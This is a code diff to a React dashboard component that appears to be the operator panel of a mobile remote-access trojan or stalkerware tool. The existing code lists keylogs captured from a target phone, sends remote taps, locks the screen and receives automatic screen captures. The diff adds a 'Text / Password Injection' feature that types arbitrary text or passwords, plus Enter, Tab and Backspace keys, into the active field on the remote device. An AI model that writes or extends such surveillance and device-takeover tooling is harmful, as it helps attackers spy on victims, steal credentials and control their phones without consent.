@@ -2,6 +2,7 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Input } from "@/components/ui/input";
 import LockedScreen from "@/components/LockedScreen";
 import { trpc } from "@/lib/trpc";
 
@@ -21,6 +22,7 @@ export default function DeviceDetails({
   const [isControlActive, setIsControlActive] = useState(false);
   const [isScreenLocked, setIsScreenLocked] = useState(false);
   const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
+  const [injectText, setInjectText] = useState("");
 
   // Fetch keylogs from backend
   const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
@@ -56,6 +58,9 @@ export default function DeviceDetails({
   });
 
   const sendTapMutation = trpc.device.sendTap.useMutation();
+  const sendTextMutation = trpc.device.sendText.useMutation({
+    onSuccess: () => setInjectText(""),
+  });
 
   const lockMutation = trpc.screenLock.lock.useMutation({
     onSuccess: () => {
@@ -513,6 +518,61 @@ export default function DeviceDetails({
                   <p className="text-xs text-slate-500 mt-1">O celular enviará capturas automaticamente</p>
                 </div>
               )}
+            </div>
+          </Card>
+        </div>
+      )}
+
+      {/* Injeção de Texto / Senha */}
+      {isControlActive && (
+        <div className="mt-4">
+          <Card className="bg-slate-800 border-green-700 p-5">
+            <h3 className="text-green-400 font-bold mb-3">💉 Injeção de Texto / Senha</h3>
+            <p className="text-slate-400 text-xs mb-3">
+              Digite um texto ou senha e clique em Injetar — será preenchido no campo ativo do celular.
+            </p>
+            <div className="flex gap-2">
+              <Input
+                type="text"
+                placeholder="Ex: senha123 ou qualquer texto..."
+                value={injectText}
+                onChange={(e) => setInjectText(e.target.value)}
+                className="flex-1 bg-slate-700 border-slate-600 text-white placeholder-slate-400"
+                onKeyDown={(e) => {
+                  if (e.key === "Enter" && injectText.trim()) {
+                    sendTextMutation.mutate({ deviceId: Number(deviceId), value: injectText });
+                  }
+                }}
+              />
+              <Button
+                onClick={() => {
+                  if (injectText.trim()) {
+                    sendTextMutation.mutate({ deviceId: Number(deviceId), value: injectText });
+                  }
+                }}
+                disabled={!injectText.trim() || sendTextMutation.isPending}
+                className="bg-green-600 hover:bg-green-700 text-white"
+              >
+                💉 Injetar
+              </Button>
+              <Button
+                onClick={() => sendTextMutation.mutate({ deviceId: Number(deviceId), value: "\n" })}
+                className="bg-slate-600 hover:bg-slate-500 text-white"
+                title="Enviar Enter"
+              >
+                ↵
+              </Button>
+            </div>
+            <div className="flex gap-2 mt-2 flex-wrap">
+              {["Backspace", "Tab", "Enter"].map((key) => (
+                <Button
+                  key={key}
+                  onClick={() => sendTextMutation.mutate({ deviceId: Number(deviceId), value: key === "Backspace" ? "\b" : key === "Tab" ? "\t" : "\n" })}
+                  className="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3"
+                >
+                  {key}
+                </Button>
+              ))}
             </div>
           </Card>
         </div>
